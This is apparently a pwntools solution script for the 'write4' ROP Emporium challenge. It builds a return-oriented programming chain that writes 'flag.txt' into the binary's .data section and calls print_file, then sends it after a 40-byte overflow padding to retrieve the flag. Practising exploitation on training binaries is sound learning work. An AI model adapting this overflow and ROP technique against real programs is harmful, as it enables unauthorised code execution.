from pwn import *

context.binary = "./write4"
r = ROP(context.binary)
p = process()
dst = context.binary.get_section_by_name(".data").header.sh_addr
r(r14=dst, r15=b"flag.txt")
r.usefulGadgets()
r.print_file(dst)
print(r.dump())
p.send(b"A" * 40 + r.chain())
log.success(p.recvline_regex(rb".*{.*}.*").decode("ascii"))
